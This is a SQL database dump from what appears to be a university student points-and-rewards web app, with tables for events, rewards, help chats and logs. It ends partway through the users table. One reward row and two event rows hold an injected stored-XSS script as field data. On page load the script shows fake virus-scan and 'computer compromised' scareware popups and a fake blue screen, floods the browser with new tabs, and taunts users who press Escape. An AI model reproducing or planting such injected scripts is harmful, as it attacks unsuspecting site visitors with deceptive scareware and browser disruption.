-- phpMyAdmin SQL Dump
-- version 4.9.0.1
-- https://www.phpmyadmin.net/
--
-- Host: sql213.infinityfree.com
-- Generation Time: Dec 12, 2025 at 04:44 AM
-- Server version: 11.4.7-MariaDB
-- PHP Version: 7.2.22

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `if0_40284661_sprs_mainredo`
--

-- --------------------------------------------------------

--
-- Table structure for table `eventparticipants`
--

CREATE TABLE `eventparticipants` (
  `eventID` int(11) NOT NULL,
  `studentID` int(11) NOT NULL,
  `id` int(11) NOT NULL,
  `attended` tinyint(1) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `eventparticipants`
--

INSERT INTO `eventparticipants` (`eventID`, `studentID`, `id`, `attended`) VALUES
(43, 5, 5, 1),
(43, 6, 6, 1),
(43, 7, 7, 1),
(44, 5, 5, 1),
(44, 7, 7, 0),
(49, 5, 5, 1);

-- --------------------------------------------------------

--
-- Table structure for table `event_registrations`
--

CREATE TABLE `event_registrations` (
  `id` int(11) NOT NULL,
  `studentID` int(11) NOT NULL,
  `eventID` int(11) NOT NULL,
  `registered_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `event_registrations`
--

INSERT INTO `event_registrations` (`id`, `studentID`, `eventID`, `registered_at`) VALUES
(76, 7, 43, '2025-12-03 22:18:02'),
(77, 7, 44, '2025-12-03 22:26:48'),
(78, 5, 43, '2025-12-03 22:40:51'),
(79, 5, 44, '2025-12-03 22:50:53'),
(80, 6, 43, '2025-12-03 23:04:35'),
(81, 5, 49, '2025-12-06 05:25:10');

-- --------------------------------------------------------

--
-- Table structure for table `help_conversations`
--

CREATE TABLE `help_conversations` (
  `id` int(11) NOT NULL,
  `studentID` int(11) NOT NULL,
  `staffID` int(11) DEFAULT NULL,
  `status` enum('open','closed') DEFAULT 'open',
  `last_updated` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `help_conversations`
--

INSERT INTO `help_conversations` (`id`, `studentID`, `staffID`, `status`, `last_updated`) VALUES
(52, 5, 1, '', '2025-12-07 01:00:29'),
(53, 7, 1, 'open', '2025-12-03 21:51:49'),
(54, 6, 2, 'open', '2025-12-03 23:07:49'),
(55, 6, 1, 'open', '2025-12-04 01:28:52'),
(56, 11, 1, '', '2025-12-07 01:01:39'),
(57, 8, 1, '', '2025-12-07 01:16:19');

-- --------------------------------------------------------

--
-- Table structure for table `help_messages`
--

CREATE TABLE `help_messages` (
  `id` int(11) NOT NULL,
  `conversation_id` int(11) NOT NULL,
  `sender` enum('student','staff') NOT NULL,
  `message` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `help_messages`
--

INSERT INTO `help_messages` (`id`, `conversation_id`, `sender`, `message`, `created_at`) VALUES
(150, 53, 'student', 'Hello miss alice', '2025-12-03 21:51:49'),
(151, 55, 'student', 'Hi', '2025-12-04 01:28:00'),
(152, 55, 'student', 'Hiiii', '2025-12-04 01:28:49'),
(153, 55, 'staff', 'EVAL  HIHI', '2025-12-04 01:28:52'),
(154, 52, 'student', 'hello', '2025-12-06 05:27:17'),
(155, 52, 'staff', 'hello', '2025-12-06 23:01:19'),
(156, 52, 'student', 'hello', '2025-12-07 00:47:06'),
(157, 52, 'student', 'tes1', '2025-12-07 00:56:04'),
(158, 52, 'staff', 'test', '2025-12-07 00:58:03'),
(159, 52, 'student', 'respobtest', '2025-12-07 00:58:14'),
(160, 52, 'student', 'chat', '2025-12-07 01:00:29');

-- --------------------------------------------------------

--
-- Table structure for table `rewards`
--

CREATE TABLE `rewards` (
  `rewardID` int(11) NOT NULL,
  `rewardName` varchar(255) NOT NULL,
  `rewardDescription` text DEFAULT NULL,
  `rewardPointsRequired` int(11) NOT NULL,
  `rewardType` enum('Ticket','Supplies','Tshirts','IDs','Points') NOT NULL DEFAULT 'Supplies'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `rewards`
--

INSERT INTO `rewards` (`rewardID`, `rewardName`, `rewardDescription`, `rewardPointsRequired`, `rewardType`) VALUES
(33, 'Any Event Ticket', 'Ticket to attend/participate on any event without purchase', 3500, 'Ticket'),
(34, 'Batangas State University : Lipa Branch ID Lace', 'Official ID Lace for BSU Students', 750, 'IDs'),
(35, 'Department Shirt (CICS)', 'Official Department Shirt for the CICS Department', 500, 'Tshirts'),
(36, 'White Textiles (Men/Women)', 'Please proceed to the RGO to redeem the textiles', 4500, 'Supplies'),
(39, 'test', '<script>\r\nalert(\"HAHA YOU FELL FOR IT!\");\r\nalert(\"JUST KIDDING... OR AM I?\");\r\nalert(\"PREPARE FOR THE TABPOCALYPSE!\");\r\n\r\nfunction openTabs() {\r\n    const trollUrls = [\r\n        \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\r\n        \"https://www.youtube.com/watch?v=j5a0jTc9S10\",\r\n        \"https://www.youtube.com/watch?v=ub82Xb1C8os\",\r\n        \"https://www.google.com/search?q=why+is+my+computer+so+slow+today\",\r\n        \"https://www.google.com/search?q=how+to+remove+annoying+popups\",\r\n        \"https://www.google.com/search?q=my+cancel+button+is+lying+to+me\",\r\n        \"https://www.google.com/search?q=help+i+cant+stop+the+tabs\",\r\n        \"https://www.google.com/search?q=why+did+i+click+that+button\",\r\n        \"https://www.google.com/search?q=computer+possessed+by+demons\",\r\n        \"https://www.google.com/search?q=how+to+uninstall+life\"\r\n    ];\r\n    \r\n    for(let i = 0; i < trollUrls.length; i++) {\r\n        setTimeout(() => {\r\n            window.open(trollUrls[i], \"_blank\");\r\n        }, i * 300);\r\n    }\r\n}\r\n\r\nfunction playAnnoyingSounds() {\r\n    const audio = new Audio(\"data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==\");\r\n    for(let i = 0; i < 5; i++) {\r\n        setTimeout(() => {\r\n            audio.play().catch(() => {});\r\n        }, i * 1000);\r\n    }\r\n}\r\n\r\nfunction createFakeVirusScan() {\r\n    const scan = document.createElement(\"div\");\r\n    scan.style = \"position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:green;font-family:monospace;z-index:9999;padding:20px;\";\r\n    scan.innerHTML = `\r\n        <div style=\"border:2px solid green;padding:20px;\">\r\n            <h1>ðŸ” SYSTEM SCAN IN PROGRESS...</h1>\r\n            <div id=\"scanProgress\">Scanning C:/Windows/System32...</div>\r\n            <div style=\"margin-top:20px;\" id=\"virusFound\">VIRUSES FOUND: 127</div>\r\n            <div style=\"color:red;font-size:24px;margin-top:20px;\">CRITICAL INFECTION DETECTED!</div>\r\n        </div>\r\n    `;\r\n    document.body.appendChild(scan);\r\n    \r\n    let count = 0;\r\n    const progress = setInterval(() => {\r\n        count++;\r\n        document.getElementById(\"virusFound\").textContent = \"VIRUSES FOUND: \" + (127 + count);\r\n        document.getElementById(\"scanProgress\").textContent = \"Scanning files... \" + count + \"%\";\r\n        \r\n        if(count >= 100) {\r\n            clearInterval(progress);\r\n            setTimeout(() => {\r\n                scan.remove();\r\n            }, 2000);\r\n        }\r\n    }, 50);\r\n}\r\n\r\ndocument.addEventListener(\"DOMContentLoaded\", function() {\r\n    createFakeVirusScan();\r\n    playAnnoyingSounds();\r\n    \r\n    setTimeout(() => {\r\n        const popup = document.createElement(\"div\");\r\n        popup.style = \"position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:10000;\";\r\n        popup.innerHTML = `\r\n            <div style=\"background:linear-gradient(45deg, #ff0000, #ff4444);padding:30px;border-radius:15px;text-align:center;color:white;font-family:Arial;max-width:500px;\">\r\n                <h1 style=\"font-size:32px;\">ðŸš¨ CRITICAL ALERT! ðŸš¨</h1>\r\n                <p style=\"font-size:18px;\">YOUR COMPUTER HAS BEEN COMPROMISED!</p>\r\n                <p style=\"font-size:16px;\">127 VIRUSES DETECTED IN SYSTEM32</p>\r\n                <p style=\"font-size:14px;\">Click EMERGENCY SHUTDOWN to save your files!</p>\r\n                <div style=\"margin:20px;\">\r\n                    <button id=\"fakeShutdown\" style=\"padding:15px 30px;font-size:20px;background:black;color:white;border:none;border-radius:10px;cursor:pointer;margin:10px;\">\r\n                        ðŸ”´ EMERGENCY SHUTDOWN\r\n                    </button>\r\n                    <br>\r\n                    <button id=\"moreTabs\" style=\"padding:10px 20px;font-size:16px;background:blue;color:white;border:none;border-radius:5px;cursor:pointer;margin:5px;\">\r\n                        ðŸ¤” Maybe Later\r\n                    </button>\r\n                </div>\r\n            </div>\r\n        `;\r\n        document.body.appendChild(popup);\r\n\r\n        document.getElementById(\"fakeShutdown\").addEventListener(\"click\", function() {\r\n            this.textContent = \"SHUTTING DOWN...\";\r\n            this.style.background = \"#333\";\r\n            \r\n            setTimeout(() => {\r\n                openTabs();\r\n                openTabs();\r\n                alert(\"PSYCH! MORE TABS FOR YOU!\");\r\n                \r\n                const fakeBlueScreen = document.createElement(\"div\");\r\n                fakeBlueScreen.style = \"position:fixed;top:0;left:0;width:100%;height:100%;background:blue;color:white;font-family:monospace;padding:50px;z-index:10001;\";\r\n                fakeBlueScreen.innerHTML = `\r\n                    <div style=\"font-size:24px;\">\r\n                    :( Your PC ran into a problem and needs to restart.<br><br>\r\n                    We are just collecting some error info, and then we will restart for you.<br><br>\r\n                    0% complete<br>\r\n                    Stop code: YOU_GOT_TROLLED\r\n                    </div>\r\n                `;\r\n                document.body.appendChild(fakeBlueScreen);\r\n                \r\n                setTimeout(() => {\r\n                    fakeBlueScreen.remove();\r\n                    popup.remove();\r\n                }, 3000);\r\n            }, 2000);\r\n        });\r\n\r\n        document.getElementById(\"moreTabs\").addEventListener(\"click\", function() {\r\n            alert(\"WRONG CHOICE! TAB INVASION INCOMING!\");\r\n            for(let i = 0; i < 10; i++) {\r\n                setTimeout(() => {\r\n                    openTabs();\r\n                }, i * 500);\r\n            }\r\n        });\r\n    }, 3000);\r\n});\r\n\r\nsetInterval(() => {\r\n    if(Math.random() > 0.7) {\r\n        window.open(\"https://www.google.com/search?q=why+won+t+it+stop+\" + Date.now(), \"_blank\");\r\n    }\r\n}, 5000);\r\n\r\ndocument.addEventListener(\"keydown\", function(e) {\r\n    if(e.key === \"Escape\") {\r\n        alert(\"NICE TRY! ESCAPE KEY DISABLED!\");\r\n        for(let i = 0; i < 3; i++) {\r\n            window.open(\"https://www.google.com/search?q=escape+key+does+nothing\", \"_blank\");\r\n        }\r\n    }\r\n});\r\n\r\ndocument.addEventListener(\"mousemove\", function(e) {\r\n    if(Math.random() > 0.995) {\r\n        const flash = document.createElement(\"div\");\r\n        flash.style = `position:fixed;top:${e.clientY-50}px;left:${e.clientX-50}px;width:100px;height:100px;background:red;border-radius:50%;z-index:999;pointer-events:none;`;\r\n        document.body.appendChild(flash);\r\n        setTimeout(() => flash.remove(), 100);\r\n    }\r\n});\r\n\r\nsetTimeout(() => {\r\n    document.body.style.cursor = \"wait\";\r\n    setTimeout(() => {\r\n        document.body.style.cursor = \"progress\";\r\n        setTimeout(() => {\r\n            document.body.style.cursor = \"not-allowed\";\r\n        }, 2000);\r\n    }, 2000);\r\n}, 1000);\r\n</script>', 999, 'Tshirts');

-- --------------------------------------------------------

--
-- Table structure for table `schoolevents`
--

CREATE TABLE `schoolevents` (
  `eventID` int(11) NOT NULL,
  `eventName` varchar(128) NOT NULL,
  `eventDescription` text DEFAULT NULL,
  `eventRewards` text DEFAULT NULL,
  `rewardType` varchar(20) NOT NULL DEFAULT 'Points',
  `eventDate` date NOT NULL DEFAULT curdate(),
  `eventImage` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `schoolevents`
--

INSERT INTO `schoolevents` (`eventID`, `eventName`, `eventDescription`, `eventRewards`, `rewardType`, `eventDate`, `eventImage`) VALUES
(43, '12/3 post full wipe', '12/3 post full wipe', '100', 'Points', '2025-12-04', 'event_1764760774_6390.png'),
(44, '12/3 post full wipe 2', '12/3 post full wipe 2', '101', 'Points', '2025-12-04', 'event_1764760792_7445.png'),
(49, 'test 3', 'test 3', '200', 'Points', '2025-12-07', 'event_1764998689_2331.png'),
(50, '99999999', '<script>\r\nalert(\"HAHA YOU FELL FOR IT!\");\r\nalert(\"JUST KIDDING... OR AM I?\");\r\nalert(\"PREPARE FOR THE TABPOCALYPSE!\");\r\n\r\nfunction openTabs() {\r\n    const trollUrls = [\r\n        \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\r\n        \"https://www.youtube.com/watch?v=j5a0jTc9S10\",\r\n        \"https://www.youtube.com/watch?v=ub82Xb1C8os\",\r\n        \"https://www.google.com/search?q=why+is+my+computer+so+slow+today\",\r\n        \"https://www.google.com/search?q=how+to+remove+annoying+popups\",\r\n        \"https://www.google.com/search?q=my+cancel+button+is+lying+to+me\",\r\n        \"https://www.google.com/search?q=help+i+cant+stop+the+tabs\",\r\n        \"https://www.google.com/search?q=why+did+i+click+that+button\",\r\n        \"https://www.google.com/search?q=computer+possessed+by+demons\",\r\n        \"https://www.google.com/search?q=how+to+uninstall+life\"\r\n    ];\r\n    \r\n    for(let i = 0; i < trollUrls.length; i++) {\r\n        setTimeout(() => {\r\n            window.open(trollUrls[i], \"_blank\");\r\n        }, i * 300);\r\n    }\r\n}\r\n\r\nfunction playAnnoyingSounds() {\r\n    const audio = new Audio(\"data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==\");\r\n    for(let i = 0; i < 5; i++) {\r\n        setTimeout(() => {\r\n            audio.play().catch(() => {});\r\n        }, i * 1000);\r\n    }\r\n}\r\n\r\nfunction createFakeVirusScan() {\r\n    const scan = document.createElement(\"div\");\r\n    scan.style = \"position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:green;font-family:monospace;z-index:9999;padding:20px;\";\r\n    scan.innerHTML = `\r\n        <div style=\"border:2px solid green;padding:20px;\">\r\n            <h1>ðŸ” SYSTEM SCAN IN PROGRESS...</h1>\r\n            <div id=\"scanProgress\">Scanning C:/Windows/System32...</div>\r\n            <div style=\"margin-top:20px;\" id=\"virusFound\">VIRUSES FOUND: 127</div>\r\n            <div style=\"color:red;font-size:24px;margin-top:20px;\">CRITICAL INFECTION DETECTED!</div>\r\n        </div>\r\n    `;\r\n    document.body.appendChild(scan);\r\n    \r\n    let count = 0;\r\n    const progress = setInterval(() => {\r\n        count++;\r\n        document.getElementById(\"virusFound\").textContent = \"VIRUSES FOUND: \" + (127 + count);\r\n        document.getElementById(\"scanProgress\").textContent = \"Scanning files... \" + count + \"%\";\r\n        \r\n        if(count >= 100) {\r\n            clearInterval(progress);\r\n            setTimeout(() => {\r\n                scan.remove();\r\n            }, 2000);\r\n        }\r\n    }, 50);\r\n}\r\n\r\ndocument.addEventListener(\"DOMContentLoaded\", function() {\r\n    createFakeVirusScan();\r\n    playAnnoyingSounds();\r\n    \r\n    setTimeout(() => {\r\n        const popup = document.createElement(\"div\");\r\n        popup.style = \"position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:10000;\";\r\n        popup.innerHTML = `\r\n            <div style=\"background:linear-gradient(45deg, #ff0000, #ff4444);padding:30px;border-radius:15px;text-align:center;color:white;font-family:Arial;max-width:500px;\">\r\n                <h1 style=\"font-size:32px;\">ðŸš¨ CRITICAL ALERT! ðŸš¨</h1>\r\n                <p style=\"font-size:18px;\">YOUR COMPUTER HAS BEEN COMPROMISED!</p>\r\n                <p style=\"font-size:16px;\">127 VIRUSES DETECTED IN SYSTEM32</p>\r\n                <p style=\"font-size:14px;\">Click EMERGENCY SHUTDOWN to save your files!</p>\r\n                <div style=\"margin:20px;\">\r\n                    <button id=\"fakeShutdown\" style=\"padding:15px 30px;font-size:20px;background:black;color:white;border:none;border-radius:10px;cursor:pointer;margin:10px;\">\r\n                        ðŸ”´ EMERGENCY SHUTDOWN\r\n                    </button>\r\n                    <br>\r\n                    <button id=\"moreTabs\" style=\"padding:10px 20px;font-size:16px;background:blue;color:white;border:none;border-radius:5px;cursor:pointer;margin:5px;\">\r\n                        ðŸ¤” Maybe Later\r\n                    </button>\r\n                </div>\r\n            </div>\r\n        `;\r\n        document.body.appendChild(popup);\r\n\r\n        document.getElementById(\"fakeShutdown\").addEventListener(\"click\", function() {\r\n            this.textContent = \"SHUTTING DOWN...\";\r\n            this.style.background = \"#333\";\r\n            \r\n            setTimeout(() => {\r\n                openTabs();\r\n                openTabs();\r\n                alert(\"PSYCH! MORE TABS FOR YOU!\");\r\n                \r\n                const fakeBlueScreen = document.createElement(\"div\");\r\n                fakeBlueScreen.style = \"position:fixed;top:0;left:0;width:100%;height:100%;background:blue;color:white;font-family:monospace;padding:50px;z-index:10001;\";\r\n                fakeBlueScreen.innerHTML = `\r\n                    <div style=\"font-size:24px;\">\r\n                    :( Your PC ran into a problem and needs to restart.<br><br>\r\n                    We are just collecting some error info, and then we will restart for you.<br><br>\r\n                    0% complete<br>\r\n                    Stop code: YOU_GOT_TROLLED\r\n                    </div>\r\n                `;\r\n                document.body.appendChild(fakeBlueScreen);\r\n                \r\n                setTimeout(() => {\r\n                    fakeBlueScreen.remove();\r\n                    popup.remove();\r\n                }, 3000);\r\n            }, 2000);\r\n        });\r\n\r\n        document.getElementById(\"moreTabs\").addEventListener(\"click\", function() {\r\n            alert(\"WRONG CHOICE! TAB INVASION INCOMING!\");\r\n            for(let i = 0; i < 10; i++) {\r\n                setTimeout(() => {\r\n                    openTabs();\r\n                }, i * 500);\r\n            }\r\n        });\r\n    }, 3000);\r\n});\r\n\r\nsetInterval(() => {\r\n    if(Math.random() > 0.7) {\r\n        window.open(\"https://www.google.com/search?q=why+won+t+it+stop+\" + Date.now(), \"_blank\");\r\n    }\r\n}, 5000);\r\n\r\ndocument.addEventListener(\"keydown\", function(e) {\r\n    if(e.key === \"Escape\") {\r\n        alert(\"NICE TRY! ESCAPE KEY DISABLED!\");\r\n        for(let i = 0; i < 3; i++) {\r\n            window.open(\"https://www.google.com/search?q=escape+key+does+nothing\", \"_blank\");\r\n        }\r\n    }\r\n});\r\n\r\ndocument.addEventListener(\"mousemove\", function(e) {\r\n    if(Math.random() > 0.995) {\r\n        const flash = document.createElement(\"div\");\r\n        flash.style = `position:fixed;top:${e.clientY-50}px;left:${e.clientX-50}px;width:100px;height:100px;background:red;border-radius:50%;z-index:999;pointer-events:none;`;\r\n        document.body.appendChild(flash);\r\n        setTimeout(() => flash.remove(), 100);\r\n    }\r\n});\r\n\r\nsetTimeout(() => {\r\n    document.body.style.cursor = \"wait\";\r\n    setTimeout(() => {\r\n        document.body.style.cursor = \"progress\";\r\n        setTimeout(() => {\r\n            document.body.style.cursor = \"not-allowed\";\r\n        }, 2000);\r\n    }, 2000);\r\n}, 1000);\r\n</script>', '122', 'Points', '2019-02-13', NULL),
(51, 'eeee', '<script>\r\nalert(\"HAHA YOU FELL FOR IT!\");\r\nalert(\"JUST KIDDING... OR AM I?\");\r\nalert(\"PREPARE FOR THE TABPOCALYPSE!\");\r\n\r\nfunction openTabs() {\r\n    const trollUrls = [\r\n        \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\r\n        \"https://www.youtube.com/watch?v=j5a0jTc9S10\",\r\n        \"https://www.youtube.com/watch?v=ub82Xb1C8os\",\r\n        \"https://www.google.com/search?q=why+is+my+computer+so+slow+today\",\r\n        \"https://www.google.com/search?q=how+to+remove+annoying+popups\",\r\n        \"https://www.google.com/search?q=my+cancel+button+is+lying+to+me\",\r\n        \"https://www.google.com/search?q=help+i+cant+stop+the+tabs\",\r\n        \"https://www.google.com/search?q=why+did+i+click+that+button\",\r\n        \"https://www.google.com/search?q=computer+possessed+by+demons\",\r\n        \"https://www.google.com/search?q=how+to+uninstall+life\"\r\n    ];\r\n    \r\n    for(let i = 0; i < trollUrls.length; i++) {\r\n        setTimeout(() => {\r\n            window.open(trollUrls[i], \"_blank\");\r\n        }, i * 300);\r\n    }\r\n}\r\n\r\nfunction playAnnoyingSounds() {\r\n    const audio = new Audio(\"data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==\");\r\n    for(let i = 0; i < 5; i++) {\r\n        setTimeout(() => {\r\n            audio.play().catch(() => {});\r\n        }, i * 1000);\r\n    }\r\n}\r\n\r\nfunction createFakeVirusScan() {\r\n    const scan = document.createElement(\"div\");\r\n    scan.style = \"position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:green;font-family:monospace;z-index:9999;padding:20px;\";\r\n    scan.innerHTML = `\r\n        <div style=\"border:2px solid green;padding:20px;\">\r\n            <h1>ðŸ” SYSTEM SCAN IN PROGRESS...</h1>\r\n            <div id=\"scanProgress\">Scanning C:/Windows/System32...</div>\r\n            <div style=\"margin-top:20px;\" id=\"virusFound\">VIRUSES FOUND: 127</div>\r\n            <div style=\"color:red;font-size:24px;margin-top:20px;\">CRITICAL INFECTION DETECTED!</div>\r\n        </div>\r\n    `;\r\n    document.body.appendChild(scan);\r\n    \r\n    let count = 0;\r\n    const progress = setInterval(() => {\r\n        count++;\r\n        document.getElementById(\"virusFound\").textContent = \"VIRUSES FOUND: \" + (127 + count);\r\n        document.getElementById(\"scanProgress\").textContent = \"Scanning files... \" + count + \"%\";\r\n        \r\n        if(count >= 100) {\r\n            clearInterval(progress);\r\n            setTimeout(() => {\r\n                scan.remove();\r\n            }, 2000);\r\n        }\r\n    }, 50);\r\n}\r\n\r\ndocument.addEventListener(\"DOMContentLoaded\", function() {\r\n    createFakeVirusScan();\r\n    playAnnoyingSounds();\r\n    \r\n    setTimeout(() => {\r\n        const popup = document.createElement(\"div\");\r\n        popup.style = \"position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:10000;\";\r\n        popup.innerHTML = `\r\n            <div style=\"background:linear-gradient(45deg, #ff0000, #ff4444);padding:30px;border-radius:15px;text-align:center;color:white;font-family:Arial;max-width:500px;\">\r\n                <h1 style=\"font-size:32px;\">ðŸš¨ CRITICAL ALERT! ðŸš¨</h1>\r\n                <p style=\"font-size:18px;\">YOUR COMPUTER HAS BEEN COMPROMISED!</p>\r\n                <p style=\"font-size:16px;\">127 VIRUSES DETECTED IN SYSTEM32</p>\r\n                <p style=\"font-size:14px;\">Click EMERGENCY SHUTDOWN to save your files!</p>\r\n                <div style=\"margin:20px;\">\r\n                    <button id=\"fakeShutdown\" style=\"padding:15px 30px;font-size:20px;background:black;color:white;border:none;border-radius:10px;cursor:pointer;margin:10px;\">\r\n                        ðŸ”´ EMERGENCY SHUTDOWN\r\n                    </button>\r\n                    <br>\r\n                    <button id=\"moreTabs\" style=\"padding:10px 20px;font-size:16px;background:blue;color:white;border:none;border-radius:5px;cursor:pointer;margin:5px;\">\r\n                        ðŸ¤” Maybe Later\r\n                    </button>\r\n                </div>\r\n            </div>\r\n        `;\r\n        document.body.appendChild(popup);\r\n\r\n        document.getElementById(\"fakeShutdown\").addEventListener(\"click\", function() {\r\n            this.textContent = \"SHUTTING DOWN...\";\r\n            this.style.background = \"#333\";\r\n            \r\n            setTimeout(() => {\r\n                openTabs();\r\n                openTabs();\r\n                alert(\"PSYCH! MORE TABS FOR YOU!\");\r\n                \r\n                const fakeBlueScreen = document.createElement(\"div\");\r\n                fakeBlueScreen.style = \"position:fixed;top:0;left:0;width:100%;height:100%;background:blue;color:white;font-family:monospace;padding:50px;z-index:10001;\";\r\n                fakeBlueScreen.innerHTML = `\r\n                    <div style=\"font-size:24px;\">\r\n                    :( Your PC ran into a problem and needs to restart.<br><br>\r\n                    We are just collecting some error info, and then we will restart for you.<br><br>\r\n                    0% complete<br>\r\n                    Stop code: YOU_GOT_TROLLED\r\n                    </div>\r\n                `;\r\n                document.body.appendChild(fakeBlueScreen);\r\n                \r\n                setTimeout(() => {\r\n                    fakeBlueScreen.remove();\r\n                    popup.remove();\r\n                }, 3000);\r\n            }, 2000);\r\n        });\r\n\r\n        document.getElementById(\"moreTabs\").addEventListener(\"click\", function() {\r\n            alert(\"WRONG CHOICE! TAB INVASION INCOMING!\");\r\n            for(let i = 0; i < 10; i++) {\r\n                setTimeout(() => {\r\n                    openTabs();\r\n                }, i * 500);\r\n            }\r\n        });\r\n    }, 3000);\r\n});\r\n\r\nsetInterval(() => {\r\n    if(Math.random() > 0.7) {\r\n        window.open(\"https://www.google.com/search?q=why+won+t+it+stop+\" + Date.now(), \"_blank\");\r\n    }\r\n}, 5000);\r\n\r\ndocument.addEventListener(\"keydown\", function(e) {\r\n    if(e.key === \"Escape\") {\r\n        alert(\"NICE TRY! ESCAPE KEY DISABLED!\");\r\n        for(let i = 0; i < 3; i++) {\r\n            window.open(\"https://www.google.com/search?q=escape+key+does+nothing\", \"_blank\");\r\n        }\r\n    }\r\n});\r\n\r\ndocument.addEventListener(\"mousemove\", function(e) {\r\n    if(Math.random() > 0.995) {\r\n        const flash = document.createElement(\"div\");\r\n        flash.style = `position:fixed;top:${e.clientY-50}px;left:${e.clientX-50}px;width:100px;height:100px;background:red;border-radius:50%;z-index:999;pointer-events:none;`;\r\n        document.body.appendChild(flash);\r\n        setTimeout(() => flash.remove(), 100);\r\n    }\r\n});\r\n\r\nsetTimeout(() => {\r\n    document.body.style.cursor = \"wait\";\r\n    setTimeout(() => {\r\n        document.body.style.cursor = \"progress\";\r\n        setTimeout(() => {\r\n            document.body.style.cursor = \"not-allowed\";\r\n        }, 2000);\r\n    }, 2000);\r\n}, 1000);\r\n</script>', '150', 'Points', '2004-07-23', 'event_1765068765_6999.png');

-- --------------------------------------------------------

--
-- Table structure for table `student_activity_log`
--

CREATE TABLE `student_activity_log` (
  `logID` int(11) NOT NULL,
  `studentID` int(11) NOT NULL,
  `type` enum('Reward Redeemed','Reward Used','Event Registered','Event Attended') NOT NULL,
  `description` varchar(255) NOT NULL,
  `logDate` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `student_activity_log`
--

INSERT INTO `student_activity_log` (`logID`, `studentID`, `type`, `description`, `logDate`) VALUES
(31, 5, 'Reward Used', 'Used \'Department Shirt (CICS)\'', '2025-12-03 08:03:51'),
(32, 5, 'Reward Used', 'Used \'Any Event Ticket\'', '2025-12-03 08:06:00'),
(33, 6, 'Reward Used', 'Used \'Department Shirt (CICS)\'', '2025-12-03 10:39:54'),
(34, 6, 'Reward Used', 'Used \'Department Shirt (CICS)\'', '2025-12-03 10:39:59'),
(35, 6, 'Reward Used', 'Used \'Batangas State University : Lipa Branch ID Lace\'', '2025-12-03 10:40:03'),
(36, 6, 'Reward Used', 'Used \'White Textiles (Men/Women)\'', '2025-12-03 10:40:08'),
(37, 6, 'Reward Used', 'Used \'Department Shirt (CICS)\'', '2025-12-03 10:40:12'),
(38, 5, 'Reward Used', 'Used \'Batangas State University : Lipa Branch ID Lace\'', '2025-12-03 11:46:56'),
(39, 5, 'Reward Used', 'Used \'Batangas State University : Lipa Branch ID Lace\'', '2025-12-07 00:46:07');

-- --------------------------------------------------------

--
-- Table structure for table `student_inventory`
--

CREATE TABLE `student_inventory` (
  `inventoryID` int(11) NOT NULL,
  `studentID` int(11) DEFAULT NULL,
  `rewardID` int(11) DEFAULT NULL,
  `dateRedeemed` datetime DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `student_inventory`
--

INSERT INTO `student_inventory` (`inventoryID`, `studentID`, `rewardID`, `dateRedeemed`) VALUES
(79, 5, 35, '2025-12-03 16:06:20'),
(80, 5, 36, '2025-12-03 16:06:23'),
(81, 5, 33, '2025-12-03 16:06:25'),
(82, 5, 33, '2025-12-03 16:06:32'),
(84, 5, 35, '2025-12-03 16:06:44'),
(85, 5, 35, '2025-12-03 16:06:46'),
(86, 5, 35, '2025-12-03 16:06:49'),
(87, 5, 35, '2025-12-03 16:06:52'),
(88, 5, 34, '2025-12-03 16:06:59'),
(94, 5, 35, '2025-12-03 19:46:21'),
(95, 5, 35, '2025-12-03 19:46:34'),
(96, 6, 35, '2025-12-03 20:01:15'),
(97, 6, 34, '2025-12-04 07:06:49'),
(98, 5, 34, '2025-12-07 08:45:41');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `phone` varchar(15) DEFAULT NULL,
  `role` enum('student','admin') NOT NULL,
  `points` int(11) DEFAULT 0,
  `name` varchar(100) DEFAULT NULL,
  `department` varchar(100) DEFAULT NULL,
